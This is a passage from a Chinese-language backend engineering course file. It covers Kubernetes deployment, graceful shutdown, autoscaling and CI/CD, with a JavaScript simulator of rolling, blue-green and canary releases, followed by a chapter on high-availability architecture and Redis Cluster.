4. **Seccomp/AppArmor**：限制系统调用。

    # K8s SecurityContext
    securityContext:
      runAsNonRoot: true
      runAsUser: 1000
      readOnlyRootFilesystem: true
      allowPrivilegeEscalation: false
      capabilities:
        drop: ["ALL"]

### H.3 网络安全

1. **NetworkPolicy**：限制 Pod 间通信。
2. **Service Mesh**：mTLS 加密服务间通信。
3. **入口控制**：API Gateway + WAF。

---

## 附录 I：K8s 优雅停机详解

### I.1 为什么需要优雅停机

直接 kill Pod 会导致：
- 正在处理的请求中断（用户看到 5xx）。
- 数据库连接未关闭（连接泄漏）。
- 消息未确认（消息丢失）。

### I.2 优雅停机流程

    1. K8s 发送 SIGTERM 给 Pod。
    2. Pod 进入 Terminating 状态。
    3. preStop hook 执行（等 LB 摘除流量）。
    4. 应用收到 SIGTERM，停止接受新请求。
    5. 处理完存量请求。
    6. 关闭数据库连接、清理资源。
    7. 进程退出。
    8. K8s 删除 Pod。

### I.3 配置

    spec:
      terminationGracePeriodSeconds: 60  # 给 60 秒优雅退出
      containers:
        - name: app
          lifecycle:
            preStop:
              exec:
                command: ["sleep", "10"]  # 等 LB 摘除
          # 应用侧要处理 SIGTERM

### I.4 多语言对照（信号处理）

**Java（Spring Boot）**：

    # application.yml
    server:
      shutdown: graceful  # 优雅停机
    spring:
      lifecycle:
        timeout-per-shutdown-phase: 30s

**Go**：

    sigChan := make(chan os.Signal, 1)
    signal.Notify(sigChan, syscall.SIGTERM)
    <-sigChan
    server.Shutdown(ctx)  // 优雅关闭 HTTP server

**Python**：

    import signal
    def handle_sigterm(signum, frame):
        server.shutdown()
    signal.signal(signal.SIGTERM, handle_sigterm)

**Node.js**：

    process.on('SIGTERM', () => {
      server.close(() => {
        process.exit(0)
      })
    })

---

## 附录 J：部署常见问题

### J.1 Pod 一直 Pending

原因：资源不足、调度约束不满足、镜像拉不下来。

排查：kubectl describe pod <name>，看 Events。

### J.2 CrashLoopBackOff

原因：容器启动后崩溃，K8s 重试，又崩溃。

排查：kubectl logs <pod> --previous，看上次崩溃日志。

### J.3 OOMKilled

原因：容器内存超限被杀。

解决：调大 resources.limits.memory，或排查内存泄漏。

### J.4 ImagePullBackOff

原因：镜像不存在、Registry 认证失败、网络不通。

排查：检查镜像名拼写、配置 imagePullSecrets。

### J.5 Service 无法访问

原因：selector 不匹配、端口不对、kube-proxy 异常。

排查：kubectl get endpoints <service>，看是否有 endpoints。

---

## 附录 K：部署术语速查表

| 术语 | 含义 |
|------|------|
| Container | 容器，轻量级隔离 |
| Image | 镜像，容器的只读模板 |
| Pod | K8s 最小调度单位 |
| Deployment | 无状态应用控制器 |
| StatefulSet | 有状态应用控制器 |
| Service | 服务，稳定访问入口 |
| Ingress | 七层路由 |
| ConfigMap | 非敏感配置 |
| Secret | 敏感配置 |
| HPA | 水平 Pod 自动扩缩容 |
| Namespace | 命名空间，资源隔离 |
| Helm | K8s 包管理器 |
| CI | 持续集成 |
| CD | 持续交付/部署 |
| GitOps | Git 驱动的部署 |
| ArgoCD | GitOps 工具 |
| Blue-Green | 蓝绿部署 |
| Canary | 金丝雀发布 |
| Rolling Update | 滚动更新 |
| Graceful Shutdown | 优雅停机 |

掌握这些术语，部署和运维相关的文档和实践就能顺畅理解。部署是软件交付的"最后一公里"——代码写得再好，部署不好也白搭。好的部署体系让交付"快、稳、安全"——快速上线、稳定运行、安全可控。

---

## 附录 L：HPA 自动扩缩容详解

HPA（Horizontal Pod Autoscaler）根据指标自动扩缩 Pod 数量。

### L.1 工作原理

1. HPA Controller 每 15 秒查询一次指标（CPU、内存或自定义）。
2. 计算期望副本数：desired = currentReplicas × (currentMetric / targetMetric)。
3. 如果期望数和当前数不同，更新 Deployment replicas。
4. Deployment Controller 创建/删除 Pod。

### L.2 基于 CPU 的 HPA

    apiVersion: autoscaling/v2
    kind: HorizontalPodAutoscaler
    metadata:
      name: app-hpa
    spec:
      scaleTargetRef:
        apiVersion: apps/v1
        kind: Deployment
        name: app
      minReplicas: 2
      maxReplicas: 20
      metrics:
        - type: Resource
          resource:
            name: cpu
            target:
              type: Utilization
              averageUtilization: 70  # CPU 使用率超 70% 扩容

### L.3 自定义指标 HPA

基于业务指标（如 QPS）扩缩容，需要 Metrics Server + Custom Metrics API：

    metrics:
      - type: Pods
        pods:
          metric:
            name: http_requests_per_second
          target:
            type: AverageValue
            averageValue: "1000"  # 每 Pod 1000 QPS 时扩容

### L.4 扩缩容策略

    behavior:
      scaleUp:
        stabilizationWindowSeconds: 0    # 立即扩容
        policies:
          - type: Percent
            value: 100                     # 每次最多翻倍
            periodSeconds: 60
      scaleDown:
        stabilizationWindowSeconds: 300   # 5 分钟稳定期才缩容
        policies:
          - type: Percent
            value: 10                      # 每次最多缩 10%
            periodSeconds: 60

扩容快（立即响应流量增长），缩容慢（防止抖动）。这是生产推荐的配置。

---

## 附录 M：部署最佳实践 Checklist

1. Dockerfile 用多阶段构建，最终镜像最小化。
2. 容器以非 root 用户运行。
3. 镜像固定版本 tag，不用 latest。
4. CI 流水线包含测试、Lint、安全扫描。
5. CD 支持蓝绿/金丝雀，不只是全量替换。
6. 有一键回滚能力。
7. 配置和密钥与代码分离（ConfigMap/Secret）。
8. 优雅停机（preStop + SIGTERM 处理）。
9. 健康检查（liveness + readiness probe）。
10. 资源限制（requests + limits）。
11. HPA 自动扩缩容。
12. GitOps 管理部署声明。
13. 监控和告警覆盖部署事件。
14. 变更窗口和审批流程。
15. 定期演练回滚流程。

---

## 附录 N：CI/CD 工具对比

| 工具 | 类型 | 特点 | 适用 |
|------|------|------|------|
| Jenkins | 自托管 | 插件丰富、灵活、老牌 | 大型企业 |
| GitHub Actions | SaaS | GitHub 集成、简单、免费额度 | GitHub 项目 |
| GitLab CI | SaaS/自托管 | GitLab 集成、.gitlab-ci.yml | GitLab 项目 |
| CircleCI | SaaS | 速度快、并行好 | 中小型 |
| ArgoCD | K8s 原生 | GitOps、K8s 专用 | K8s 部署 |
| Argo Rollouts | K8s 原生 | 金丝雀、蓝绿部署 | K8s 高级部署 |
| Spinnaker | 自托管 | 多云部署、强大 | 大型企业 |

选型建议：

- 小团队 + GitHub：GitHub Actions。
- 中团队 + GitLab：GitLab CI。
- 大企业 + 复杂需求：Jenkins + ArgoCD。
- K8s 专注：ArgoCD + Argo Rollouts。

---

## 附录 O：部署面试速查

- Q：容器和 VM 区别？ A：容器共享内核、轻量、秒启动；VM 独立内核、隔离强、重。
- Q：Docker 分层？ A：UnionFS + Copy-on-Write，镜像层只读共享，容器层可写。
- Q：K8s Pod 和容器关系？ A：Pod 是最小调度单位，含一个或多个容器，共享网络和存储。
- Q：滚动更新原理？ A：逐批创建新 Pod、删除旧 Pod，maxSurge 和 maxUnavailable 控制。
- Q：蓝绿和金丝雀区别？ A：蓝绿全量切换，金丝雀渐进放量。
- Q：GitOps？ A：Git 是唯一真相源，ArgoCD 自动同步 Git 到集群。
- Q：优雅停机？ A：preStop + SIGTERM + terminationGracePeriod，处理完存量请求再退出。
- Q：HPA 原理？ A：定期查指标，算期望副本数，自动调整 Deployment。

---

## 附录 P：部署文化与实践

好的部署不只是工具，更是文化：

1. **自动化优先**：能自动的不手动，减少人为错误。
2. **小步快跑**：小批量、高频次发布，每次变更可控。
3. **可回滚**：每次发布都能快速回滚，有回滚预案。
4. **可观测**：部署后监控指标，异常自动告警。
5. **不可变基础设施**：不修改运行中的服务器，改了就重新部署。
6. **基础设施即代码**：所有配置用代码管理，可版本化。
7. **安全左移**：安全检查融入 CI，不等到生产才发现。
8. **故障是学习**：出问题不追责，复盘改进流程。

部署体系的成熟度：

- L0：手动部署、SSH 到服务器拉代码。
- L1：脚本化部署、有 Dockerfile。
- L2：CI 自动化、镜像化部署。
- L3：CD 自动化、金丝雀/蓝绿、GitOps。
- L4：自动扩缩容、自愈、混沌工程。

大多数公司在 L2-L3。向 L4 演进需要完善的监控、自动化和团队能力。

部署是工程能力的集中体现——它连接了开发和运维，是代码变成服务的关键环节。好的部署体系让团队"敢发布、快发布、稳发布"，让交付从"痛苦"变成"习惯"。`,
    code: `// ============================================================
// 部署与 CI/CD —— 可运行示例
// 实现部署策略模拟器：RollingUpdate + BlueGreen + Canary 回滚
// ============================================================

let podCounter = 0;
function newPod(version) {
  podCounter++;
  return {
    id: 'pod-' + podCounter,
    version,
    status: 'Running',
    ready: true,
    createdAt: Date.now(),
    errorRate: Math.random() * 0.02,  // 正常 0-2% 错误率
  };
}

// ---------- 1. Deployment 模拟器 ----------
class Deployment {
  constructor(name, replicas, version) {
    this.name = name;
    this.replicas = replicas;
    this.pods = [];
    this.version = version;
    for (let i = 0; i < replicas; i++) this.pods.push(newPod(version));
  }

  snapshot() {
    return this.pods.map(p => p.id + '(v' + p.version + ',' + p.status + ')');
  }

  // 模拟某版本错误率
  setErrorRate(version, rate) {
    this.pods.filter(p => p.version === version).forEach(p => p.errorRate = rate);
  }

  avgErrorRate() {
    if (!this.pods.length) return 0;
    return this.pods.reduce((s, p) => s + p.errorRate, 0) / this.pods.length;
  }
}

// ---------- 2. 滚动更新 ----------
function rollingUpdate(dep, newVersion, maxSurge = 1, maxUnavailable = 1) {
  console.log('--- 滚动更新 v' + dep.version + ' -> v' + newVersion + ' ---');
  const oldPods = [...dep.pods];
  let step = 1;
  while (dep.pods.some(p => p.version !== newVersion)) {
    // 删除 maxUnavailable 个旧 Pod
    for (let i = 0; i < maxUnavailable && dep.pods.some(p => p.version !== newVersion); i++) {
      const idx = dep.pods.findIndex(p => p.version !== newVersion);
      const removed = dep.pods.splice(idx, 1)[0];
      console.log('  步骤' + step + ': 删除 ' + removed.id + '(v' + removed.version + ')');
    }
    // 新增 maxSurge 个新 Pod
    for (let i = 0; i < maxSurge && dep.pods.length < dep.replicas + maxSurge; i++) {
      if (dep.pods.filter(p => p.version === newVersion).length < dep.replicas) {
        const p = newPod(newVersion);
        dep.pods.push(p);
        console.log('  步骤' + step + ': 创建 ' + p.id + '(v' + newVersion + ')');
      }
    }
    // 修剪到 replicas
    while (dep.pods.length > dep.replicas) {
      const idx = dep.pods.findIndex(p => p.version !== newVersion);
      if (idx >= 0) dep.pods.splice(idx, 1);
      else break;
    }
    console.log('  当前: ' + dep.snapshot().join(', '));
    step++;
  }
  dep.version = newVersion;
  console.log('  滚动更新完成\\n');
}

// ---------- 3. 蓝绿部署 ----------
class BlueGreen {
  constructor(replicas, version) {
    this.blue = new Deployment('app', replicas, version);
    this.green = null;
    this.active = 'blue';
  }
  deploy(newVersion) {
    console.log('--- 蓝绿部署 v' + newVersion + ' ---');
    this.green = new Deployment('app', this.blue.replicas, newVersion);
    console.log('  绿环境就绪: ' + this.green.snapshot().join(', '));
    console.log('  当前流量: 蓝(v' + this.blue.version + ')');
    return this.green;
  }
  switchTo(env) {
    this.active = env;
    const target = env === 'green' ? this.green : this.blue;
    console.log('  流量切换到 ' + env + '(v' + target.version + ')');
  }
  rollback() {
    console.log('  回滚: 流量切回 ' + (this.active === 'green' ? 'blue' : 'green'));
    this.switchTo(this.active === 'green' ? 'blue' : 'green');
  }
}

// ---------- 4. 金丝雀发布 ----------
function canaryDeploy(dep, newVersion, thresholds = { errorRate: 0.05 }) {
  console.log('--- 金丝雀发布 v' + newVersion + ' ---');
  const stages = [5, 25, 50, 100];
  const oldVersion = dep.version;
  for (const pct of stages) {
    // 模拟该阶段：pct 流量到新版本
    const newPodCount = Math.max(1, Math.round(dep.replicas * pct / 100));
    // 临时添加新 Pod（模拟灰度）
    const newPods = [];
    for (let i = 0; i < newPodCount; i++) newPods.push(newPod(newVersion));
    // 模拟错误率检测
    const sampleErrorRate = Math.random() < 0.25 ? 0.08 : Math.random() * 0.02;  // 25% 概率故障
    console.log('  灰度 ' + pct + '%: 新版本错误率 ' + (sampleErrorRate * 100).toFixed(1) + '%');
    if (sampleErrorRate > thresholds.errorRate) {
      console.log('  [告警] 错误率 ' + (sampleErrorRate * 100).toFixed(1) + '% 超阈值 ' + (thresholds.errorRate * 100) + '%，自动回滚！');
      console.log('  流量切回 v' + oldVersion + '\\n');
      return false;  // 回滚
    }
    console.log('  指标正常，继续');
  }
  // 全量通过，替换所有 Pod
  rollingUpdate(dep, newVersion);
  console.log('  金丝雀发布成功\\n');
  return true;
}

// ---------- 5. 演示 ----------
console.log('===== 1. 滚动更新演示 =====');
const dep1 = new Deployment('order-service', 4, '1.0');
console.log('初始: ' + dep1.snapshot().join(', '));
rollingUpdate(dep1, '1.1', 1, 1);

console.log('===== 2. 蓝绿部署演示 =====');
const bg = new BlueGreen(3, '1.0');
console.log('初始(蓝): ' + bg.blue.snapshot().join(', '));
bg.deploy('2.0');
bg.switchTo('green');
console.log('  发现问题！');
bg.rollback();

console.log('\\n===== 3. 金丝雀发布演示 =====');
const dep2 = new Deployment('payment-service', 4, '1.0');
console.log('初始: ' + dep2.snapshot().join(', '));
// 设置新版本高错误率模拟故障
const result = canaryDeploy(dep2, '2.0', { errorRate: 0.05 });
console.log('发布结果: ' + (result ? '成功' : '已回滚'));

console.log('\\n===== 4. 金丝雀成功场景 =====');
const dep3 = new Deployment('user-service', 4, '1.0');
canaryDeploy(dep3, '1.1', { errorRate: 0.05 });

console.log('\\n===== 演示结束 =====');
`,
  },

  // =========================================================
  // 第五章：高可用架构
  // =========================================================
  {
    id: "backend-ha",
    group: "分布式与工程化",
    icon: "🏗",
    title: "高可用架构",
    content: `## 高可用架构

**高可用（High Availability, HA）** 是指系统在较长时间内持续提供正常服务的能力。理想状态下系统 7×24 永不宕机，现实中通过冗余、故障转移、降级等手段把宕机时间压缩到极低。高可用是后端架构的终极目标之一——对很多业务（金融、医疗、电商）来说，每分钟宕机都是真金白银的损失。

本章从高可用定义出发，讲解核心原则、单点消除、冗余设计、故障转移、各层高可用方案、异地多活、容灾、降级限流、混沌工程，以及高可用 Checklist。

### 一、高可用定义

#### 1.1 可用性计算

可用性 = 系统正常时间 / (系统正常时间 + 故障时间)

业界用"几个 9"衡量：

| 可用性 | 年宕机时间 | 月宕机 | 级别 |
|--------|------------|--------|------|
| 99% | 3.65 天 | 7.2 小时 | 普通 |
| 99.9% | 8.76 小时 | 43.2 分钟 | 较高 |
| 99.99% | 52.6 分钟 | 4.32 分钟 | 高 |
| 99.999% | 5.26 分钟 | 25.9 秒 | 极高（五个 9） |
| 99.9999% | 31.5 秒 | 2.6 秒 | 超高（六个 9） |

每多一个 9，难度指数级增长。99.9% 用单机房+主从备份就能达到；99.99% 需要多机房；99.999% 需要异地多活+完善的自动化故障转移。99.999% 以上通常只有核心金融系统追求，成本极高。

#### 1.2 可用性不是"零故障"

高可用不等于"永远不出故障"——故障必然发生（硬件坏、网络抖、代码 bug）。高可用的本质是"故障发生时用户无感知"：通过冗余和快速切换，让故障被吸收，不影响用户体验。

所以高可用架构的核心问题是：
1. 如何避免单点故障（冗余）。
2. 故障发生时如何快速切换（故障转移）。
3. 故障影响大时如何保住核心（降级限流）。

---

### 二、高可用核心原则

#### 2.1 冗余（Redundancy）

每个环节至少两份：两台 LB、两台应用、主从 DB、集群缓存。一台坏了另一台顶上。冗余是高可用的基础——没有冗余就没有故障转移的可能。

#### 2.2 故障转移（Failover）

故障检测到自动切换流量到备用节点。要快（秒级）且自动（不依赖人工）。慢的故障转移等于宕机。

#### 2.3 降级（Degradation）

系统过载或部分故障时，主动牺牲非核心功能，保住核心功能。如商品详情页挂了，用缓存的静态页；推荐服务挂了，返回热门商品。

#### 2.4 隔离（Isolation）

故障不扩散。线程池隔离防止一个慢调用拖垮全部；机房隔离防止一个机房故障影响全局；资源隔离防止 A 服务抢光 CPU 影响 B 服务。

#### 2.5 限流（Rate Limiting）

保护系统不被超量流量压垮。超过能力的请求拒绝，保住已接收的请求能正常处理。

#### 2.6 熔断（Circuit Breaking）

下游故障时快速失败，不堆积请求拖垮自己。详见限流熔断章节。

这六原则贯穿高可用架构的每一层。

---

### 三、单点故障消除

**单点（Single Point of Failure, SPOF）** 是高可用的头号敌人。系统里任何一个"只有一份"的组件都是单点——它挂了系统就挂。

消除单点的检查清单：

| 层 | 单点风险 | 高可用方案 |
|----|----------|-----------|
| DNS | 单一 DNS | 多 DNS 服务商 |
| CDN | 单 CDN | 多 CDN 灾备 |
| 负载均衡 | 单 LB | 双机热备（Keepalived） |
| 网关 | 单网关 | 多实例 |
| 应用 | 单实例 | 多实例部署 |
| 缓存 | 单 Redis | 主从+哨兵/集群 |
| 数据库 | 单 DB | 主从/MGR |
| 消息队列 | 单 Broker | 多 Broker 副本 |
| 配置中心 | 单 ConfigServer | 集群 |

每个环节都要问："这个挂了怎么办？" 答不上来就是单点。

---

### 四、冗余设计

#### 4.1 主备（Active-Standby）

一台主对外服务，一台备待命。主挂了备顶上。备机可能"冷备"（不跑业务，只等切换）或"热备"（实时同步数据，随时可切）。

#### 4.2 主主（Active-Active）

多台都对外服务，互为备份。性能和利用率高，但数据一致性复杂（双写冲突）。适合无状态服务（应用层）或有冲突解决机制的场景（如 Cassandra 多写）。

#### 4.3 集群

多节点组成集群，共同服务，自动分担负载和容错。如 K8s 多 Node、Redis Cluster、Kafka 多 Broker。

#### 4.4 热备/温备/冷备

- **热备**：备机实时同步数据，故障秒级切换。成本高，切换快。
- **温备**：备机定期同步（如每小时），切换有数据丢失。成本中。
- **冷备**：备机不运行，靠备份恢复。切换慢（小时级），成本低。

核心系统用热备，边缘系统可用温备/冷备。

---

### 五、故障转移机制

#### 5.1 心跳检测

主备间持续心跳，备机发现主机心跳超时则认为主机故障，发起切换。心跳间隔和超时阈值要平衡：太短误判（网络抖动），太长切换慢。

#### 5.2 VIP 漂移（Keepalived）

Keepalived 基于 VRRP 协议，主备共享一个 VIP（虚拟 IP）。客户端访问 VIP，VIP 绑定在主节点。主挂了，备接管 VIP，流量自动切到备。切换对客户端透明（IP 不变）。

\`\`\`
客户端 → VIP(192.168.1.100)
         主节点(绑定 VIP)  ←  心跳
         备节点(待命)
主挂 → 备接管 VIP → 流量切到备
\`\`\`

#### 5.3 自动切换

故障转移要自动化（脚本/编排），人工切换太慢。但自动切换有风险——"脑裂"（split-brain）：网络分区导致主备都认为对方挂了，都成为主，数据冲突。

#### 5.4 脑裂防范

- **Quorum（多数派）**：奇数节点，切换需多数同意。如 3 节点，需 2 票才能切。
- **Fencing**：切换前先"隔离"旧主（如关电源、停进程），确保旧主不再写。
- **见证节点（Witness）**：第三方节点参与投票，打破平票。

---

### 六、负载均衡层高可用

LB 自身不能是单点。常见方案：
- **双机热备**：两台 LB + Keepalived VIP，主挂备顶。LVS + Keepalived 是经典组合。
- **双活**：两台 LB 都转发流量（DNS 轮询或 Anycast），都挂才不可用。
- **Anycast**：多机房公告同一 IP，就近接入，单机房挂自动路由到其他。

---

### 七、应用层高可用

#### 7.1 无状态设计

应用层要做到无状态——会话、缓存不在本地内存，放 Redis 等共享存储。这样任何实例都能处理任何请求，实例挂了流量切到其他实例无影响。

#### 7.2 多实例

至少 2 个实例（不同机器/机架），K8s 用 replicas + PodAntiAffinity 让 Pod 分散在不同 Node。

#### 7.3 健康检查

- **Liveness**：进程是否活着，挂了重启。
- **Readiness**：是否就绪接流量，不就绪从 LB 摘除。

#### 7.4 优雅停机

实例退出时先摘流量（不再接新请求）、处理完在途请求、再退出。避免退出时还有请求打到它导致 5xx。

---

### 八、缓存层高可用

#### 8.1 Redis 主从+哨兵

主节点写，从节点读。Sentinel（哨兵）监控主，主挂自动选举新主，通知客户端切换。

#### 8.2 Redis Cluster

数据分片（16384 槽位），每片主从。自动 failover，横向扩展。生产大数据量用 Cluster。

#### 8.3 多级缓存

本地缓存（Caffeine）+ 分布式缓存（Redis）+ 持久层。Redis 挂了本地缓存兜底，降级到 DB。

---

### 九、数据库高可用

#### 9.1 MySQL 主从

主写从读，读写分离。主挂手动/自动提升从为主。数据有延迟（异步复制），切换可能丢数据。

#### 9.2 MHA / Orchestrator

MHA、Orchestrator 是 MySQL 高可用管理工具，监控主，主挂自动选最新从提升为新主。

#### 9.3 MGR（MySQL Group Replication）

基于 Paxos 的多主复制，自动 failover，强一致性。但性能有损耗。

#### 9.4 读写分离 + 分库分表

读分散到多个从库，写分到多个主库（分片）。用 ShardingSphere、MyCAT 等中间件。

---

### 十、消息队列高可用

#### 10.1 Kafka

每个 Partition 多副本，Leader 对外读写，Follower 同步。Leader 挂选举 Follower。ISR（In-Sync Replicas）机制保证数据安全——只有 ISR 里的副本才能被选为 Leader。

#### 10.2 RabbitMQ

镜像队列（Mirror Queue）把队列复制到多节点。或用 Quorum Queue（基于 Raft）。

---

### 十一、异地多活

同城双活/两地三中心/异地灾备，按成本和容灾能力递增。

#### 11.1 同城双活

同城两个机房，双写或一主一备。机房故障可快速切换。数据同步延迟低（同城网络好）。

#### 11.2 两地三中心

两地（如北京+上海）三中心（北京两机房+上海一机房）。北京两机房同城双活，上海做异地灾备。应对整个城市断电/灾难。

#### 11.3 异地多活

多个城市同时提供服务，流量按地域路由。数据同步用 DTS、Canal（MySQL binlog）、Otter。挑战是一致性——跨城延迟大（几十 ms），强一致性不现实，最终一致性为主。

#### 11.4 数据同步方案

- **MySQL**：Canal 订阅 binlog → MQ → 异地写入。
- **Redis**：Redis CRDT 或应用层双写。
- **ES**：CCR（Cross-Cluster Replication）。

异地多活的核心挑战：数据冲突、一致性、回环（A 同步到 B，B 又同步回 A）。要设计好单向同步或冲突解决。

#### 11.5 异地多活架构模式详解

**单元化架构**：把用户按 ID 哈希分到不同"单元"（Cell），每个单元包含完整的应用+缓存+DB，用户的数据和请求都在一个单元内闭环处理。单元间通过消息异步同步。这样大部分请求不需跨机房，只有少数跨单元操作（如好友关系跨单元）走专线。

\`\`\`
用户 ID % 4 = 0 → 北京单元(应用+Redis+MySQL)
用户 ID % 4 = 1 → 上海单元(应用+Redis+MySQL)
用户 ID % 4 = 2 → 深圳单元(应用+Redis+MySQL)
用户 ID % 4 = 3 → 成都单元(应用+Redis+MySQL)
单元间：Canal binlog 异步同步
\`\`\`

单元化的好处：流量本地闭环、延迟低、单单元故障不影响其他。挑战：跨单元操作复杂、数据分配不均、扩容要重新分片。阿里、美团都用单元化架构支撑异地多活。

**中心-边缘模式**：一个中心机房（写），多个边缘机房（读）。写请求路由到中心，读请求就近边缘。适合"读多写少"的场景（如内容分发）。边缘数据从中心异步同步。

**双写模式**：两个机房都写，通过时间戳或版本号解决冲突。一致性最难保证，只适合无冲突或冲突可接受的场景。

#### 11.6 数据一致性级别

| 级别 | 说明 | 延迟 | 适用 |
|------|------|------|------|
| 强一致 | 写入立即可读，跨机房用同步复制 | 高（跨城 RTT） | 金融交易 |
| 最终一致 | 写入后异步同步，短暂不一致 | 低 | 大多数业务 |
| 读己之写 | 用户自己写完能立刻读到自己的数据 | 中 | 社交、订单 |

异地多活通常用最终一致 + 读己之写（通过 session 粘性或写后短时间路由到写机房保证）。

#### 11.7 故障切换流程

异地多活的机房切换是大事，要谨慎：
1. **检测**：监控发现某机房全面故障（健康检查全部失败）。
2. **决策**：确认是真故障而非网络抖动（避免误切），评估数据同步状态。
3. **DNS 切换**：把域名解析切到备用机房（TTL 控制切换速度，建议短 TTL）。
4. **流量切换**：LB 层把流量导到新机房。
5. **数据兜底**：可能丢少量未同步数据，需事后对账补偿。
6. **回切**：原机房恢复后，先补齐数据差异，再灰度回切。

切换演练要定期做——没演练过的切换方案，真出事时大概率切不过去。

---

### 十二、容灾设计

#### 12.1 RTO 与 RPO

- **RTO（Recovery Time Objective）**：恢复时间目标——故障后多久恢复服务。如 RTO=30 分钟。
- **RPO（Recovery Point Objective）**：恢复点目标——可容忍丢失多久数据。如 RPO=0（不丢数据），RPO=5 分钟（最多丢 5 分钟数据）。

RTO 衡量"恢复多快"，RPO 衡量"丢多少数据"。两者越小，容灾能力越强，成本越高。

#### 12.2 容灾级别

- **冷备**：异地存备份，灾难时恢复。RTO 小时级，RPO 可能小时级。
- **热备**：异地有 standby 实时同步。RTO 分钟级，RPO 秒级。
- **双活**：异地同时服务。RTO 秒级，RPO=0。

---

### 十三、降级与限流保护

详见限流熔断章节，这里补充高可用视角：

#### 13.1 降级策略

- **非核心降级**：推荐、评论、积分等挂了不影响下单，直接降级。
- **读降级**：DB 挂了用缓存，缓存挂了用本地缓存，全挂返回兜底数据。
- **写降级**：日志、统计等异步化，先存内存/本地，恢复后补写。
- **功能降级**：高峰期关闭退款、修改地址等低频功能，保下单。

#### 13.2 限流保护核心链路

大促时限流非核心接口（如查询），保住核心接口（下单、支付）的可用性。

---

### 十四、容量规划与压测

#### 14.1 全链路压测

在生产环境（或镜像环境）模拟真实流量压测，找出系统瓶颈。阿里双 11 前全链路压测是常规操作。压测要覆盖完整链路（网关→应用→DB→缓存→下游），不能只压单接口。

#### 14.2 容量评估

基于压测结果评估"当前架构能撑多少 QPS"，结合业务预测"需要多少 QPS"，算出扩容需求。

#### 14.3 扩缩容预案

提前准备扩容脚本、镜像、资源。大促前预扩容，避免临时抢资源。K8s HPA 自动扩缩容。

---

### 十五、混沌工程（Chaos Engineering）

Netflix 提出 Chaos Monkey——在生产环境随机杀实例，验证系统的容错能力。混沌工程主动注入故障（杀 Pod、断网、延迟、CPU 打满），发现系统脆弱点。

混沌实验原则：
- **生产环境**做（测试环境发现不了真实问题）。
- **从小范围开始**，逐步扩大。
- **自动化**持续运行。
- **有预案**，出问题能快速恢复。

混沌工程把"故障"从"意外"变成"常态演练"，让系统在真实故障时从容应对。

---

### 十六、高可用架构 Checklist

1. ☐ 无单点：每层至少双副本。
2. ☐ 自动故障转移：秒级切换，无人工。
3. ☐ 数据冗余：主从复制，跨机房备份。
4. ☐ 监控告警：故障秒级发现。
5. ☐ 降级限流：过载能保核心。
6. ☐ 容量预案：压测+扩容脚本。
7. ☐ 容灾演练：定期演练故障切换。
8. ☐ 优雅停机：发布无 5xx。
9. ☐ 异地容灾：RTO/RPO 达标。
10. ☐ 混沌测试：主动发现脆弱点。

---

### 十七、高可用实战案例

**电商大促保障**：
1. **扩容**：提前 2 周扩容 3 倍，核心链路预留 50% 余量。
2. **降级**：关闭推荐、评论等非核心功能，资源全给下单。
3. **限流**：下单接口限流，超过阈值排队，防止雪崩。
4. **预热**：缓存提前加载热点商品，避免缓存击穿。
5. **全链路压测**：大促前模拟 2 倍峰值流量压测，验证容量。
6. **预案**：每个故障场景配预案，一键切换/扩容/降级。
7. **值班**：核心时段全员值班，监控大屏实时盯盘。

**AWS S3 故障（2017）**：一个工程师打错命令导致美国东部 S3 大面积不可用 4 小时，半个互联网受影响。教训：即使 AWS 也出故障，高可用要假设"一切都会挂"，做好每一层的容错。

---

### 十八、本章小结

高可用架构是"为故障而设计"。核心要点：

1. **可用性用 9 衡量**，每多一个 9 难度指数级增长。
2. **六原则**：冗余、故障转移、降级、隔离、限流、熔断。
3. **消除单点**：每层至少双副本。
4. **故障转移**：心跳检测 + VIP 漂移 + 自动切换 + 脑裂防范（Quorum）。
5. **各层 HA**：LB 双机热备、应用无状态多实例、缓存主从集群、DB 主从 MGR、MQ 副本。
6. **异地多活**：同城双活→两地三中心→异地多活，数据同步用 Canal/DTS。
7. **容灾 RTO/RPO**：衡量恢复能力和数据丢失。
8. **混沌工程**：主动注入故障验证韧性。

高可用没有终点，是持续迭代的过程——每次故障都是改进的机会。

**面试高频问题**：

- 高可用几个 9 怎么算？99.99% 年宕机多久？
- 高可用核心原则？
- 什么是单点故障？怎么消除？
- 主备和主主区别？热备温备冷备？
- 脑裂是什么？怎么防范？
- Keepalived VIP 漂移原理？
- Redis 高可用方案？哨兵和 Cluster 区别？
- MySQL 高可用方案？MGR 原理？
- RTO 和 RPO 是什么？双活和热备区别？
- 异地多活数据怎么同步？一致性怎么保证？
- 混沌工程是什么？为什么要做？
- 大促保障怎么做？

**延伸阅读**：

- 《Site Reliability Engineering》—— Google SRE
- 《Release It!》—— Michael Nygard
- 《Designing Distributed Systems》—— Brendan Burns
- Netflix Chaos Engineering：https://netflix.github.io/chaosmonkey/

---

## 附录 A：Redis Cluster 深度剖析

Redis Cluster 是 Redis 官方的分布式方案，通过分片+副本实现高可用和高性能。理解其内部机制对设计缓存高可用至关重要。

### A.1 数据分片：16384 个哈希槽

Redis Cluster 没有"一致性哈希"，而是用"哈希槽"分片。整个键空间被分成 16384 个槽，每个节点负责一部分。

**为什么是 16384？** 这是 Redis 作者权衡的结果：

- 槽太多（如 65536）：节点间心跳包大，带 Gossip 协议开销。
- 槽太少（如 1024）：集群规模上限低（建议每节点最多 1024 槽，1024 槽最多 1 节点显然不够）。
- 16384 折中：支持上千节点，心跳包约 2KB（16384/8 = 2KB 位图）。

**路由算法**：

\`\`\`
slot = CRC16(key) mod 16384
\`\`\`

CRC16 是一种校验和算法，对 key 做 CRC16 再对 16384 取模得到槽位。客户端缓存 slot→node 映射，直接连目标节点。

**Hash Tag**：要让多个 key 在同一槽（便于事务/MULTI），用花括号包一部分：

\`\`\`
SET {user:1001}:profile ...
SET {user:1001}:order ...
\`\`\`

只有花括号内的部分参与 CRC16，所以这俩 key 一定在同一节点。

### A.2 集群拓扑与 Gossip 协议

Redis Cluster 是"去中心化"的，没有主节点总控。每个节点都存完整拓扑，通过 Gossip 协议互相交换状态。

**Gossip 工作方式**：

- 每个节点维护一份集群状态（哪些节点、什么角色、负责哪些槽）。
- 每秒随机选 5 个节点，发送 PING，附带自己已知的部分节点信息。
- 收到 PING 的节点回 PONG，也附带自己知道的信息。
- 信息像传染病一样扩散，几秒内全集群同步。

**故障检测**也是 Gossip 驱动：

1. A 给 B 发 PING，超时没回 PONG，A 标记 B 为 PFAIL（疑似下线）。
2. A 通过 Gossip 把"B 可能下线"告诉其他节点。
3. 超过半数主节点都报告 B 的 PFAIL，B 被标记为 FAIL（确定下线）。
